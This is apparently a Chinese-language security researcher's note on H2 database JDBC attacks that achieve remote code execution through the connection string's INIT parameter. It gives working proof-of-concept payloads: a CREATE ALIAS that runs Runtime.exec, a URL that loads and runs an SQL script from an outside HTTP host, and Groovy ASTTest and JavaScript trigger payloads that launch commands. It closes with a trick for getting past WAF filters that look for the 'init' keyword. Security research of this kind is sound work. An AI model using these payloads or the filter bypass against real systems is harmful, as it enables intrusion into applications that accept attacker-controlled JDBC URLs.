- [H2 JDBC Attack](#h2-jdbc-attack)
  - [漏洞原理](#漏洞原理)
    - [Execute SQL on Connection](#execute-sql-on-connection)
    - [UDF](#udf)
    - [远程加载SQL](#远程加载sql)
    - [本地执行SQL](#本地执行sql)
      - [Groovy](#groovy)
      - [ScriptEngineManager](#scriptenginemanager)

# H2 JDBC Attack
## 漏洞原理
### Execute SQL on Connection
h2支持在连接时指定初始化执行SQL语句.
http://www.h2database.com/html/features.html?highlight=init&search=init#execute_sql_on_connection    
![](2023-07-24-18-21-51.png)   
比如`String url = "jdbc:h2:mem:test;INIT=runscript from '~/create.sql'\\;`
### UDF
而在h2中也支持通过`CREATE ALIAS`和`CREATE TRIGGER`命令创建用户自定义函数(UDF).  
https://www.h2database.com/html/commands.html#create_alias  
![](2023-08-03-10-46-55.png)  
https://www.h2database.com/html/commands.html#create_trigger  
![](2023-07-24-18-55-24.png)    
所以便可以通过UDF来进行RCE.  
```sql
CREATE ALIAS EXEC AS 'void shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);}';
select EXEC ('calc.exe');
```
结合两个特性,我们便可以在连接到h2数据库时进行RCE.
### 远程加载SQL 
而从代码中可以看到对文件名是调用的`FileUtils.newInputStream(file);`进行处理.  
![](2023-07-24-18-45-37.png)  
而最后如果不是从classPath开头地址的话就会使用URL连接打开.  
![](2023-07-24-18-47-42.png)   
所以SQL语句是支持执行远程地址的sql文件.  
比如`jdbc:h2:mem:test;INIT=runscript from 'http://172.21.165.206:8080/init.sql'`  
![](2023-08-03-10-51-08.png)  
### 本地执行SQL
#### Groovy
而如果目标不能连接到外部地址,那么则不能通过远程SQL文件来RCE,而`CREATE ALIAS`还支持Groovy语言来创建UDF,而Groovy的元编程特性可以导致在Groovy编译时就执行代码,因为在h2 JDBC连接时从无法直接在JDBC连接字符串中连续执行多条语句.
需要依赖
```xml
        <dependency>
        <groupId>org.codehaus.groovy</groupId>
        <artifactId>groovy-sql</artifactId>
        <version>3.0.8</version>
    </dependency>
```
poc
```
        String url = "jdbc:h2:mem:test;init=CREATE ALIAS shell2 AS \n" +
                "$$@groovy.transform.ASTTest(value={\n" +
                " assert java.lang.Runtime.getRuntime().exec(\"cmd.exe /c calc.exe\")\n" +
                " })\n" +
                " def x$$";
```
![](2023-08-03-11-08-33.png)
#### ScriptEngineManager
而在`CREATE TRIGGER`中还支持执行javascript和ruby,当代码以`//javascript`和`#ruby`开头便会调用对应的引擎进行编译执行了,而javascript时JAVA自带的不需要其它依赖.
![](2023-08-03-11-13-48.png)  
poc: 
```
String url = "jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON \n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                " java.lang.Runtime.getRuntime().exec('cmd /c calc.exe')\n" +
                " $$";
```
![](2023-08-03-11-16-27.png)

* 在h2中$$之间的字符串不会被转义.
* `//javascript`后面需要换行,在浏览器中输入后,需要在Burp中手动换行.
* 有些程序或者waf会检测init关键字,但init前面可以加一个`\`来绕过,不影响语句执行.